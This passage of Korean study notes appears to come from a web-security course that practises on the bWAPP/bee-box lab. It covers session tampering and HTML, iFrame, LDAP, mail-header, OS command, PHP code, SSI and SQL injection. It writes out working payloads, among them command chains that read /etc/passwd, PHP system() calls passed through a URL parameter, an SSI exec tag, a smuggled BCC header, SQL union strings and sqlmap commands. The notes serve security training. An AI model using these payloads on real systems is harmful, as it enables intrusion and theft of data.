정상 경로 접속: Welcome b  출력, 세션이 강하지 않다는 메시지 표시 URL 직접 접속(다른 브라우저): 세션 정보가 없어 다른 메시지 출력

#### 10-2. 세션 변조 테스트

# 버프 스위트를 이용한 세션 변조 테스트

### 1. 다른 브라우저에서 같은 페이지에 접속

### 2. 버프 인터셉트 ON → 새로 고침

### 3. 요청 패킷의 쿠키 값을 원래 b 계정 세션 ID로 변조

### 4. Forward → 변조된 세션으로 웰컴 메시지 출력 확인

세션 ID가 변조되면 다른 사용자의 세션으로 접속 가능함을 확인이 방식으로 세션 관리 취약점 존재 여부를 점검할 수 있음

### 3. A1 인젝션 — HTML Injection

#### 3-1. HTML Injection 개요

HTML 태그를 입력 폼에 삽입했을 때 태그로 처리(실행)되는 취약점이다. 입력값에 대한 검증 절차가 없을 때 발생한다.


| 종류 | 설명 |
|---|---|
| Reflected (반사형) | GET/POST 방식으로 즉시 화면에 반영 |
| Stored (저장형) | 게시판 등에 저장되어 이후 접속 시 지속 실행 |
| Current URL | 현재 URL에 HTML 코드 삽입 |

#### 3-2. Low 레벨 실습

입력 폼에 HTML 태그를 그대로 입력하면 태그로 실행된다.

<!-- H1 태그 삽입 예시 --> <h1>테스트</h1> 태그가 실행되어 화면에 큰 글자로 출력됨을 확인

#### 3-3. Medium 레벨 — URL 인코딩 우회

Medium 레벨에서는 특수문자( < , >  등)를 필터링하여 HTML 태그를 일반 문자열로 처리한다.

URL 인코딩을 이용한 우회 방법


| 문자 | URL 인코딩 값 |
|---|---|
| < | %3C |
| > | %3E |
| / | %2F |

# URL 인코딩된 H1 태그 예시 %3Ch1%3E테스트%3C%2Fh1%3E 온라인 URL 인코딩/디코딩 사이트를 활용하여 변환 가능 인코딩된 값을 입력 폼에 넣으면 Medium 레벨에서도 인젝션 성공 URL 인코딩을 사용하는 이유는 특수 기호나 문자들에 대해 완성도를 높이기 위해서이다. 인코딩이 되어 있어도 디코딩 사이트나 인코딩 표를 통해 내용 확인이 가능하다.

#### 3-4. High 레벨

HTML 태그뿐만 아니라 인코딩된 태그도 모두 일반 문자열로 처리되어 인젝션이 차단된다.

#### 3-5. Stored HTML Injection

저장형의 경우 게시판에 HTML 태그를 집어넣고 서브밋하면, 이후 해당 게시글에 접근하는 모든 사용자에게 태그가 실행된다.

<!-- 저장형 예시 — 향후 접속 시마다 실행 --> <h1>해킹</h1> 저장형(Stored)이기 때문에 게시판에 들어오면 언제든지 실행된다. iFrame, imageSRC 등 다양한 태그를 이용하면 악성 코드나 다른 파일도 실행 가능하다.

### 4. A1 인젝션 — iFrame Injection

#### 4-1. iFrame 개념

iFrame은 하나의 웹페이지 문서 안에 별도의 액자(프레임)를 삽입하는 HTML 태그이다.

액자 안에 다른 페이지의 내용을 삽입 가능 iFrame Injection: 공격자가 원하는 내용을 담은 액자를 문서 내에 추가하는 공격

#### 4-2. iFrame URL 파라미터

Low 레벨 기본 화면에서 URL 구조를 확인한다.


| URL 파라미터 | 역할 |
|---|---|
| url | 삽입할 파일 또는 주소 (예: robots.txt ) |
| width | 액자의 가로 크기 (px) |
| height | 액자의 세로 크기 (px) |

# URL 파라미터 조작 예시 — beebox BWAPP 사이트 삽입 ?url=http://192.168.[beebox IP]/bwapp&width=500&height=500 width=0 , height=0 으로 설정하면 프레임이 보이지 않아 일반 사용자가 클릭 시 연결됨 공격자가 배너나 이벤트 당첨 글자를 넣고 클릭을 유도하면 피싱 사이트로 이동시킬 수 있다. 또한 크기를 0으로 줘서 보이지 않게 해도 클릭 시 연결이 되도록 만들 수 있다.

#### 4-3. Medium/High 레벨

Medium·High 레벨에서는 php 파일 내부 코드에서 robots.txt  파일만 프레임에 들어가도 록 이름을 지정해 놓아 다른 URL 삽입이 차단된다. URL 인코딩으로도 우회되지 않는다.

### 5. A1 인젝션 — LDAP Injection

#### 5-1. LDAP 개념

LDAP(Lightweight Directory Access Protocol)는 경량의 디렉터리 액세스 프로토콜이다.

사용자, 시스템, 프린터, 공유기, 라우터 등 네트워크로 연결된 모든 자원을 중앙에서 관 리하고 인덱싱하는 프로그램 도서관의 분류 체계처럼 자원을 정리하여 사용자가 쉽게 찾고 인증할 수 있도록 지원 LDAP 쿼리 기본 구조 예시


| 요소 | 설명 |
|---|---|
| cn | Common Name (일반 이름) |
| () | 쿼리 묶음 |
| & | AND 연산자 |
| % | 특수 연산자 |

#### 5-2. LDAP Injection 실습 (Low 레벨)

LDAP 서버에 잘못된 쿼리를 주었을 때의 반응을 확인하여 취약점을 탐색한다.

버프 스위트 HTTP 히스토리에서 ldap_connect.php  관련 패킷을 확인하면, 응답 내 자바스크립트 clear  함수가 존재함을 확인할 수 있다.

### 6. A1 인젝션 — Mail Header Injection

#### 6-1. 취약점 개요

게시판 또는 문의 폼을 통해 메일을 보낼 때, 수신자 필드에 추가 정보를 삽입하여 원래 수신자 외의 사람에게도 메일을 발송할 수 있는 취약점이다.

#### 6-2. 메일 헤더 구조


| 메일 구성 | 설명 |
|---|---|
| 헤더(Header) | 받는 사람, 보낸 날짜/시간, 보낸 사람 정보 |
| 바디(Body) | 메일 본문 내용 |

#### 6-3. 복수 수신자 및 숨은 참조 삽입

수신자 필드에 쉼표( , )를 기준으로 여러 메일 주소를 연결하거나, CC  또는 BCC  헤더를 추가하여 다수에게 발송 가능하다.


| 구분 | 헤더 | 설명 |
|---|---|---|
| 참조 | CC: | 공개 참조 |
| 숨은 참조 | BCC: | 숨은 참조 |

# 수신자 필드에 BCC 삽입 예시 test@naver.com%0aBCC:other@kakao.com Low 레벨에서는 이러한 삽입이 그대로 허용됨 Medium/High 레벨에서는 버프 스위트 등 프락시 도구로 인터셉트하여 작업해야 함 이 취약점은 실제 메일 서비스가 아니라 게시판을 통해 메일을 보내는 구조이기 때문에, 특정 사용자에게만 가야 할 내용이 다른 사용자에게도 전달된다는 점에서 취약점이 된다.

### 7. A1 인젝션 — OS Command Injection

| ; | 세미콜론 — 앞 명령 실패 여부와 관계없이 뒤 명<br>령 실행 |
| ` | ` |
| ` |  |
| && | AND — 앞 명령 성공 시 뒤 명령 실행 |

# 세미콜론을 이용한 OS Command Injection 예시 nslookup 대상도메인; id nslookup 대상도메인; cat /etc/passwd Low 레벨: 세미콜론으로 명령어 연결 시 실행 결과 출력됨 Medium 레벨: 세미콜론이 막혀있으면 파이프( | ) 등 다른 기호로 시도 High 레벨: 명령어를 연결하는 기호 대부분 차단

정보가 화면에 출력되지 않는 경우, 버프 스위트로 패킷을 인터셉트하여 응답(Response)에 서 특이한 내용이 있는지 확인한다.

ping  버튼 클릭 → 버프 인터셉트로 패킷 잡기 응답에서 td  태그 내 실행 결과 또는 연결되는 php 파일명 확인 파이프( | ), 세미콜론( ; ) 등 여러 기호를 하나씩 시도하여 반응 확인

### 8. A1 인젝션 — PHP Code Injection

#### 8-1. 취약점 개요

URL 파라미터에 PHP 코드를 삽입하여 서버에서 실행시키는 취약점이다. message  파라미터에 들어가는 값이 서버에서 처리되는 구조에서 발생한다.

#### 8-2. Low 레벨 실습

# URL에서 message 파라미터 변경 http://[beeboxIP]/bwapp/phpi.php?message=test;system('ls -al')

system()  함수: 괄호 안의 문자열을 OS 명령어로 실행 세미콜론 뒤에 PHP 코드를 삽입하면 서버에서 실행됨 # id 명령어 실행 예시 message=test;system('id')

ls -al  실행 결과, id  실행 결과 등이 화면에 출력됨 입력되는 message  파라미터에 검증 절차가 없어 취약점 발생

### 9. A1 인젝션 — SSI (Server-Side Include) Injection

#### 9-1. CSL과 SSL 비교


| 구분 | 클라이언트 사이드 언어 (CSL) | 서버 사이드 언어 (SSL) |
|---|---|---|
| 대표 언어 | HTML, CSS, JavaScript | PHP, ASP |
| 실행 위치 | 클라이언트(브라우저)에서 실행 | 서버에서 실행, 결과만 전송 |
| 브라우저 종류 영<br>향 | 브라우저 종류·버전에 따라 차이 발생 | 서버에서 처리하므로 영향 없음 |
| 보안 관점 | 악성 코드 삽입 시 각 클라이언트에서<br>실행 | 서버 내에서만 실행, 클라이언트에 결과<br>만 전달 |

보안 관점에서 SSL이 더 유리하다. CSL만으로 구성된 사이트에 악성 코드가 삽입되면 각 클라이언트에서 직접 실행되지만, SSL은 서버에서만 실행되므로 각 클라이언트에 영 향이 적다.

#### 9-2. SSI Injection 실습

SSI Injection은 서버 측 언어가 처리되는 환경에서 추가적인 PHP 코드나 명령어를 삽입하는 공격이다.

<!-- SSI 태그를 이용한 PHP 코드 삽입 예시 --> <!--#exec cmd="cat /etc/passwd"--> PHP의 exec()  함수를 이용하여 cmd 파라미터로 명령어 실행 서버에서 해당 코드가 처리되면 /etc/passwd  파일 내용이 클라이언트 브라우저에 출력됨 SSL 서버에서 처리되는 페이지이지만, 검증이 없으면 추가 삽입된 PHP 언어도 동일하게 서버에서 실행됨

## 153. SQL Injection 심화 실습

### 1. SQL Injection — Ajax/JSON/jQuery

#### 1-1. Ajax 방식의 특징

일반적인 SQL Injection 페이지는 전체 문자열 입력 후 엔터를 쳐야 결과가 나오지만, Ajax 방식은 실시간(비동기)으로 검색 결과가 출력된다.

문자 하나씩 입력할 때마다 해당 문자가 포함된 항목이 즉시 출력됨 예: i  입력 → i 가 포함된 영화 목록 출력, ir  입력 → ir 이 포함된 목록 출력

#### 1-2. SQL Injection 시도

-- Ajax 페이지에서 전체 출력 유도 ' or '1'='1 ' or 1=1 -' or 1=1 -- (공백 포함)

작은 따옴표만 입력해도 특이한 반응이 있으면 취약점 의심 가능 Union Select를 이용하여 DB 정보 조회 가능 -- union select를 이용한 DB 정보 조회 예시 (칼럼 수 맞춰야 함) ' union select 1,database(),3,4,5,6,7 from information_sche ma.tables -Ajax는 비동기 방식으로 처리되는 것뿐, 실제 SQL Injection 취약점이 존재하면 동일하게 공략할 수 있다. 입력되는 처리 방식이 다를 뿐 취약점은 동일하다.

### 9. SQL Injection — Blind

#### 9-1. Blind SQL Injection 특징

결과가 화면에 전혀 출력되지 않아 수동 점검 시 시간과 노력이 많이 필요하다.

버프 스위트로 패킷을 인터셉트하여 응답(Response)의 변화를 관찰 여러 가지 기호와 쿼리를 하나씩 시도하여 반응 차이 확인 자동화 도구 sqlmap 활용 권장

#### 9-2. sqlmap 활용

# sqlmap 기본 사용법 sqlmap -u "http://[beeboxIP]/bwapp/취약한페이지.php?파라미터= 값" --dbs # 도움말 확인 sqlmap -h h  또는 -help  옵션으로 상세한 옵션 사용법 확인 가능 SQL Injection 취약점이 있는 파라미터에 대해 자동으로 DB 정보, 테이블 정보, 계정 정보까지 획득 가능 Blind SQL Injection은 수동으로 일일이 넣어야 하므로 시간이 많이 소요된다. sqlmap 같은 자동화 도구를 통해 점검하는 것이 효율적이다.
